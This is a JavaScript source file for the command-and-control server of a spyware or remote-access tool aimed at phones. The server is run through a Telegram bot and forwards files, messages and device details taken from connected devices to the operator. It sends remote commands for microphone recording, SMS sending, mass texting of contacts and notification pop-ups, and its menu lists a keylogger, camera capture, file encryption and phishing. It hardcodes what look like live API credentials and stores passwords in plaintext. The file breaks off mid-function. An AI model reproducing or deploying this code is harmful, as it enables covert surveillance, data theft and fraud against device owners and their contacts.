const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const { createClient } = require('@supabase/supabase-js');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer(); // Handles all file types in memory

let data = {};
try {
  data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
} catch (e) {
  console.log("No data.json found or invalid format, continuing without it.");
}

// Tumhara Bot Token laga diya
const bot = new telegramBot("8709139578:AAER0NWsrjN2m1skAmD5w8fmD14Sl9yQTwE", {
  'polling': true,
  'request': {}
});

// Polling error handling to prevent crash
bot.on("polling_error", (err) => {
  console.error("Polling Error:", err.message);
});

// Tumhara Supabase URL aur Key laga di
const supabase = createClient("https://nebwfonyhfgxnfkiisvs.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lYndmb255aGZneG5ma2lpc3ZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzNjc0MjMsImV4cCI6MjA5MDk0MzQyM30.me-P_mhC3droVGrHSlD_G3h9-ZgGgR3hy8VyDLFTp58");

const appData = new Map();
const loggedInUsers = new Map();

const BASE_URL = "https://doge-production-517d.up.railway.app";

// Emojis ko categories aur actions ke hisab se set kar diya
const actions = ["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>", "<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>", "<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>", "<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>", "<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>", "<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>", "<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>", "<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>", "<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>", "<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>", "<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"];

app.use(express.json());

// Serve static files from the 'public' directory
app.use(express.static('public'));

// Force root to serve index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Disable global data post directly to root
app.post("/", (req, res) => {
    res.status(403).json({ error: "Direct root post is disabled. Use explicit endpoints." });
});

// Acha sa progress bar
const loadingFrames = ["<b>[▯▯▯▯▯▯▯▯▯▯] 0%</b>", "<b>[██▯▯▯▯▯▯▯▯] 20%</b>", "<b>[████▯▯▯▯▯▯] 40%</b>", "<b>[██████▯▯▯▯] 60%</b>", "<b>[████████▯▯] 80%</b>", "<b>[██████████] 100%</b>"];

async function sendAnimatedProgress(chatId, deviceModel) {
  const header = `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceModel}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → 𝚃𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚑𝚊𝚜 𝚜𝚝𝚊𝚛𝚝𝚎𝚍 𝚞𝚙𝚕𝚘𝚊𝚍𝚒𝚗𝚐 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚋𝚎 𝚙𝚊𝚝𝚒𝚎𝚗𝚝</b>`;
  const sentMsg = await bot.sendMessage(chatId, header + `\n\n${loadingFrames[0]}`, { 'parse_mode': "HTML" });
  let frame = 1;
  const interval = setInterval(async () => {
    if (frame >= loadingFrames.length) {
      clearInterval(interval);
      await bot.editMessageText(header + `\n\n<b>[██████████] 100% ✅</b>`, {
        chat_id: chatId,
        message_id: sentMsg.message_id,
        parse_mode: "HTML"
      });
      return;
    }
    await bot.editMessageText(header + `\n\n${loadingFrames[frame]}`, {
      chat_id: chatId,
      message_id: sentMsg.message_id,
      parse_mode: "HTML"
    });
    frame++;
  }, 800);
}

// Upload endpoint for receiving large files directly mapped to UID
app.post("/upload/:uid", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
  const uid = _0xe7d0f6.params.uid;
  const tgId = loggedInUsers.get(String(uid));
  if (!tgId) {
      return _0x30973d.status(401).send("Unauthorized");
  }

  const _0x1763f6 = _0xe7d0f6.file.originalname;
  const _0x3abcf4 = _0xe7d0f6.headers.model || "Unknown Device";
  bot.sendDocument(tgId, _0xe7d0f6.file.buffer, {
    'caption': "<b>📁 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x3abcf4 + '</b>',
    'parse_mode': "HTML"
  }, {
    'filename': _0x1763f6,
    'contentType': "*/*"
  });
  _0x30973d.send("Done");
});

app.get("/text", (_0x5b9a91, _0x340799) => {
  _0x340799.send(data.text || "System Running");
});

app.post("/register", async (req, res) => {
  const { uid, password } = req.body;
  if (!uid || !password) return res.status(400).json({ error: "uid and password required" });
  const { data: existing } = await supabase.from("rm-d").select("*").eq("uid", uid).single();
  if (existing) return res.status(409).json({ error: "User already exists" });
  const generated_url = `${BASE_URL}/uid=${uid}`; // Specific UID URL
  const { error } = await supabase.from("rm-d").insert([{ uid, password, generated_url }]);
  if (error) return res.status(500).json({ error: "Registration failed" });
  res.json({ success: true, message: "Registered successfully" });
});

app.post("/login", async (req, res) => {
  const { uid, password } = req.body;
  if (!uid || !password) return res.status(400).json({ error: "uid and password required" });
  const { data: user } = await supabase.from("rm-d").select("*").eq("uid", uid).eq("password", password).single();
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ success: true, uid: user.uid, generated_url: user.generated_url });
});

app.get("/uid=:uid", async (req, res) => {
  const { uid } = req.params;
  const { data: user } = await supabase.from("rm-d").select("uid, generated_url").eq("uid", uid).single();
  if (!user) return res.status(404).json({ error: "Not found" });
  res.json({ uid: user.uid, generated_url: user.generated_url });
});

// JSON data and extra files upload point
app.post("/uid=:uid", uploader.any(), async (req, res) => {
  const { uid } = req.params;
  const { data: user } = await supabase.from("rm-d").select("uid").eq("uid", uid).single();
  if (!user) return res.status(404).json({ error: "Not found or Unauthorized" });
  
  const tgId = loggedInUsers.get(String(uid));
  if (tgId) {
    if (req.files && req.files.length > 0) {
      for (const file of req.files) {
        await bot.sendDocument(tgId, file.buffer, {
          caption: `<b>📁 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n<b>Name:</b> ${file.originalname}`,
          parse_mode: "HTML"
        }, { filename: file.originalname, contentType: file.mimetype || "*/*" }).catch(err => {});
      }
    }
    if (req.body && Object.keys(req.body).length > 0) {
      bot.sendMessage(tgId, `<b>📊 𝙳𝚊𝚝𝚊 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍</b>\n\n<b>${JSON.stringify(req.body, null, 2)}</b>`, { 'parse_mode': "HTML" });
    }
  }
  res.json({ success: true, message: "Data received successfully" });
});

// WEBSOCKET LOGIC UPDATED FOR ROUTING APP DATA
io.on("connection", _0x48afef => {
  let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let _0x3e1fde = _0x48afef.handshake.headers.version || "no information";
  let _0x4c49f4 = _0x48afef.handshake.headers.ip || "no information";
  _0x48afef.model = _0x35d854;
  _0x48afef.version = _0x3e1fde;
  _0x48afef.ip = _0x4c49f4;

  let _0x5ede9b = "<b>🔌 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → <b>" + _0x35d854 + "</b>\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → <b>" + _0x3e1fde + "</b>\n") + ("<b>𝚒𝚙</b> → <b>" + _0x4c49f4 + "</b>\n") + ("<b>𝚝𝚒𝚖𝚎</b> → <b>" + _0x48afef.handshake.time + "</b>\n\n");
  
  // Broadcast new connection to all active users so they can claim it
  loggedInUsers.forEach((tgId, uid) => {
    bot.sendMessage(tgId, _0x5ede9b, { 'parse_mode': "HTML" });
  });

  _0x48afef.on("disconnect", () => {
    let _0x4c86f2 = "<b>🔴 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → <b>" + _0x35d854 + "</b>\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → <b>" + _0x3e1fde + "</b>\n") + ("<b>𝚒𝚙</b> → <b>" + _0x4c49f4 + "</b>\n") + ("<b>𝚝𝚒𝚖𝚎</b> → <b>" + _0x48afef.handshake.time + "</b>\n\n");
    loggedInUsers.forEach((tgId, uid) => {
      bot.sendMessage(tgId, _0x4c86f2, { 'parse_mode': "HTML" });
    });
  });

  _0x48afef.on("message", _0x44fcc5 => {
    // Agar kisi specific user ne command di thi, toh data usko milega
    if (_0x48afef.activeChatId) {
      if (_0x44fcc5 === "The device has started uploading the file, please be patient") {
        sendAnimatedProgress(_0x48afef.activeChatId, _0x35d854);
      } else {
        bot.sendMessage(_0x48afef.activeChatId, "<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x35d854 + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → \n</b><b>" + _0x44fcc5 + "</b>", {
          'parse_mode': "HTML"
        });
      }
    } else {
      // Fallback agar device khud se data bhejti hai
      loggedInUsers.forEach((tgId, uid) => {
        bot.sendMessage(tgId, "<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + _0x35d854 + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → \n</b><b>" + _0x44fcc5 + "</b>", {
          'parse_mode': "HTML"
        });
      });
    }
  });
});

bot.on("message", _0xdbde0c => {
  const chatId = _0xdbde0c.chat.id;

  if (_0xdbde0c.text === "/start") {
    bot.sendMessage(chatId, "<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 RM UCHIHA BOT\n\n⚠️ Ethical use only. This tool is made for testing and ethical use, and you are responsible for your actions.\n\n𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: <b>Romeo Uchiha</b>\n\n𝚄𝚜𝚎 /rg uid@password 𝚝𝚘 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛\n𝚄𝚜𝚎 /lg uid@password 𝚝𝚘 𝚕𝚘𝚐𝚒𝚗</b>", {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
        'resize_keyboard': true
      }
    });
  } else if (_0xdbde0c.text && _0xdbde0c.text.startsWith("/rg ")) {
    const parts = _0xdbde0c.text.slice(4).split("@");
    if (parts.length !== 2 || !parts[0] || !parts[1]) {
      bot.sendMessage(chatId, "<b>⚠️ Invalid format. Use: /rg uid@password</b>", { 'parse_mode': "HTML" });
    } else {
      const [uid, password] = parts;
      supabase.from("rm-d").select("*").eq("uid", uid).single().then(({ data: existing }) => {
        if (existing) {
             bot.sendMessage(chatId, "<b>🔴 User already exists. Try logging in with /lg</b>", { 'parse_mode': "HTML" });
        } else {
             const generated_url = `${BASE_URL}/uid=${uid}`;
             supabase.from("rm-d").insert([{ uid, password, generated_url }]).then(({error}) => {
                if (error) {
                    bot.sendMessage(chatId, "<b>🔴 Registration failed. Database error.</b>", { 'parse_mode': "HTML" });
                } else {
                    loggedInUsers.set(String(uid), chatId);
                    bot.sendMessage(chatId, `<b>✅ Registration and Login successful!\n\nWelcome, <b>Romeo Uchiha</b>.\n\n🔴 Your private dashboard URL:\n<b>${generated_url}</b></b>`, { 'parse_mode': "HTML" });
                }
             });
        }
      });
    }
  } else if (_0xdbde0c.text && _0xdbde0c.text.startsWith("/lg ")) {
    const parts = _0xdbde0c.text.slice(4).split("@");
    if (parts.length !== 2 || !parts[0] || !parts[1]) {
      bot.sendMessage(chatId, "<b>⚠️ Invalid format. Use: /lg uid@password</b>", { 'parse_mode': "HTML" });
    } else {
      const [uid, password] = parts;
      supabase.from("rm-d").select("*").eq("uid", uid).eq("password", password).single().then(({ data: user }) => {
        if (!user) {
          bot.sendMessage(chatId, "<b>🔴 Login failed. Invalid uid or password.</b>", { 'parse_mode': "HTML" });
        } else {
          loggedInUsers.set(String(uid), chatId);
          bot.sendMessage(chatId, `<b>✅ Login successful! Welcome, <b>Romeo Uchiha</b>.\n\n🔴 Your dashboard URL:\n<b>${user.generated_url}</b></b>`, { 'parse_mode': "HTML" });
        }
      });
    }
  } else {
    // Authetnication Check Ensure
    let activeUid = null;
    for (let [uid, id] of loggedInUsers.entries()) {
        if (id === chatId) {
            activeUid = uid;
            break;
        }
    }

    if(!activeUid) return; 

    // ALL appData keys are scoped to chatId to prevent users from conflicting
    if (appData.get(chatId + "_action") === "microphoneDuration") {
      let _0x3376c5 = _0xdbde0c.text;
      let _0x44b92e = appData.get(chatId + '_target');
      if (_0x44b92e == "all") {
        io.sockets.sockets.forEach(socket => {
             socket.emit("commend", { 'request': "microphone", 'extras': [{ 'key': "duration", 'value': _0x3376c5 }] });
        });
      } else {
        io.to(_0x44b92e).emit("commend", {
          'request': "microphone",
          'extras': [{ 'key': "duration", 'value': _0x3376c5 }]
        });
      }
      appData.delete(chatId + "_target");
      appData.delete(chatId + "_action");
      bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get(chatId + "_action") === "toastText") {
        let _0x3f8601 = _0xdbde0c.text;
        let _0x5c0cc9 = appData.get(chatId + '_target');
        if (_0x5c0cc9 == "all") {
          io.sockets.sockets.forEach(socket => {
             socket.emit("commend", { 'request': "toast", 'extras': [{ 'key': "text", 'value': _0x3f8601 }] });
          });
        } else {
          io.to(_0x5c0cc9).emit("commend", {
            'request': "toast",
            'extras': [{ 'key': "text", 'value': _0x3f8601 }]
          });
        }
        appData.delete(chatId + "_target");
        appData.delete(chatId + "_action");
        bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
            'resize_keyboard': true
          }
        });
      } else {
        if (appData.get(chatId + "_action") === "smsNumber") {
          let _0x16b4e5 = _0xdbde0c.text;
          appData.set(chatId + "_number", _0x16b4e5);
          appData.set(chatId + "_action", 'smsText');
          bot.sendMessage(chatId, "<b>📝 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + _0x16b4e5 + "</b>\n\n", {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
              'resize_keyboard': true,
              'one_time_keyboard': true
            }
          });
        } else {
          if (appData.get(chatId + "_action") === "smsText") {
            let _0x6d597e = _0xdbde0c.text;
            let _0x1c124a = appData.get(chatId + "_number");
            let _0x49a537 = appData.get(chatId + "_target");
            if (_0x49a537 == "all") {
              io.sockets.sockets.forEach(socket => {
                  socket.emit("commend", { 'request': "sendSms", 'extras': [{ 'key': "number", 'value': _0x1c124a }, { 'key': "text", 'value': _0x6d597e }] });
              });
            } else {
              io.to(_0x49a537).emit("commend", {
                'request': "sendSms",
                'extras': [{ 'key': "number", 'value': _0x1c124a }, { 'key': "text", 'value': _0x6d597e }]
              });
            }
            appData.delete(chatId + '_target');
            appData.delete(chatId + "_action");
            appData.delete(chatId + "_number");
            bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
              'parse_mode': "HTML",
              'reply_markup': {
                'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                'resize_keyboard': true
              }
            });
          } else {
            if (appData.get(chatId + "_action") === "vibrateDuration") {
              let _0x26f07c = _0xdbde0c.text;
              let _0x3275f8 = appData.get(chatId + "_target");
              if (_0x3275f8 == "all") {
                io.sockets.sockets.forEach(socket => {
                       socket.emit("commend", { 'request': "vibrate", 'extras': [{ 'key': "duration", 'value': _0x26f07c }] });
                });
              } else {
                io.to(_0x3275f8).emit("commend", {
                  'request': "vibrate",
                  'extras': [{ 'key': "duration", 'value': _0x26f07c }]
                });
              }
              appData.delete(chatId + "_target");
              appData.delete(chatId + "_action");
              bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                'parse_mode': "HTML",
                'reply_markup': {
                  'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                  'resize_keyboard': true
                }
              });
            } else {
              if (appData.get(chatId + "_action") === "textToAllContacts") {
                let _0x535777 = _0xdbde0c.text;
                let _0x3b22c4 = appData.get(chatId + "_target");
                if (_0x3b22c4 == "all") {
                  io.sockets.sockets.forEach(socket => {
                          socket.emit("commend", { 'request': "smsToAllContacts", 'extras': [{ 'key': "text", 'value': _0x535777 }] });
                  });
                } else {
                  io.to(_0x3b22c4).emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{ 'key': "text", 'value': _0x535777 }]
                  });
                }
                appData.delete(chatId + "_target");
                appData.delete(chatId + "_action");
                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                  'parse_mode': "HTML",
                  'reply_markup': {
                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                    'resize_keyboard': true
                  }
                });
              } else {
                if (appData.get(chatId + "_action") === "notificationText") {
                  let _0x371a40 = _0xdbde0c.text;
                  appData.set(chatId + "_notificationText", _0x371a40);
                  let target = appData.get(chatId + '_target');
                  if (target == "all") {
                    io.sockets.sockets.forEach(socket => {
                            socket.emit("commend", { 'request': "popNotification", 'extras': [{ 'key': "text", 'value': _0x371a40 }] });
                    });
                  } else {
                    io.to(target).emit("commend", {
                      'request': 'popNotification',
                      'extras': [{ 'key': "text", 'value': _0x371a40 }, { 'key': "url", 'value': BASE_URL }]
                    });
                  }
                  appData.delete(chatId + '_target');
                  appData.delete(chatId + "_action");
                  appData.delete(chatId + "_notificationText");
                  bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                    'parse_mode': "HTML",
                    'reply_markup': {
                      'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                      'resize_keyboard': true
                    }
                  });
                } else {
                  if (_0xdbde0c.text === "<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>") {
                    let _0x1e2656 = "<b>📱 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 :</b>\n\n";
                    let count = 0;
                    io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5) => {
                         count++;
                         _0x1e2656 += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + count + "</b>\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → <b>" + _0x3479dd.model + "</b>\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → <b>" + _0x3479dd.version + "</b>\n") + ("<b>𝚒𝚙</b> → <b>" + _0x3479dd.ip + "</b>\n") + ("<b>𝚝𝚒𝚖𝚎</b> → <b>" + _0x3479dd.handshake.time + "</b>\n\n");
                    });
                    if (count === 0) {
                      bot.sendMessage(chatId, "<b>📭 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚊𝚌𝚌𝚘𝚞𝚗𝚝</b>\n\n", {
                        'parse_mode': "HTML"
                      });
                    } else {
                      bot.sendMessage(chatId, _0x1e2656, {
                        'parse_mode': "HTML"
                      });
                    }
                  } else {
                    if (_0xdbde0c.text === "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>") {
                      let _0x307c8a = [];
                      let count = 0;
                      io.sockets.sockets.forEach((_0x6307e5, _0x56439e) => {
                           count++;
                           _0x307c8a.push([`<b>${_0x6307e5.model}</b>`]);
                      });

                      if (count === 0) {
                        bot.sendMessage(chatId, "<b>📭 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚊𝚌𝚌𝚘𝚞𝚗𝚝</b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
                        _0x307c8a.push(["<b>🌐 𝙰𝚕𝚕 🔴</b>"]);
                        _0x307c8a.push(["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]);
